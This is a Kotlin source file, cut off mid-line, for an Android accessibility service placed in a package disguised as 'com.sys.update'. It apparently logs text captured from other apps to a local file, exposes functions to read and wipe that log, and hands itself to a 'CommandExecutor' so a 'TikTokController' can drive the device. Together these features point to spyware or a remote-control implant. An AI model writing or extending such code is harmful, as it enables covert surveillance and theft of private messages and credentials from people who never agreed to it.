package com.sys.update

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class AccessibilityHelper : AccessibilityService() {

    private val timeFmt = SimpleDateFormat("HH:mm:ss", Locale.US)
    private val dateFmt = SimpleDateFormat("yyyy-MM-dd", Locale.US)
    private val lastTextByPkg = HashMap<String, String>()

    companion object {
        fun isEnabled(context: Context): Boolean {
            val service = "${context.packageName}/${AccessibilityHelper::class.java.name}"
            val enabled = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            val splitter = TextUtils.SimpleStringSplitter(':')
            splitter.setString(enabled)
            while (splitter.hasNext()) {
                if (splitter.next().equals(service, ignoreCase = true)) return true
            }
            return false
        }

        fun readCapturedTexts(ctx: Context, limit: Int = 300): List<String> {
            val result = mutableListOf<String>()
            try {
                val f = File(ctx.filesDir, "accessibility.jsonl")
                if (!f.exists()) return result
                val lines = f.readLines()
                result.addAll(lines.takeLast(limit))
            } catch (_: Exception) {}
            return result
        }

        fun clearCapturedTexts(ctx: Context) {
            try {
                val f = File(ctx.filesDir, "accessibility.jsonl")
                if (f.exists()) f.delete()
            } catch (_: Exception) {}
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("AccessibilityHelper", "Service connected")
        // ⭐ سجّل المرجع ليستخدمه TikTokController
        CommandExecutor.accessibilityServiceRef = this
    }

    override fun onUnbind(intent: android.content.Intent?): Boolean {
        CommandExecutor.accessibilityServiceRef = null
        return super.onUnbind(intent)
    }

    override fun onDestroy() {
        CommandExecutor.accessibilityServiceRef = null
        super.onDestroy()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        try {
            val pkg = event.packageName?.toString() ?: return
            if (p
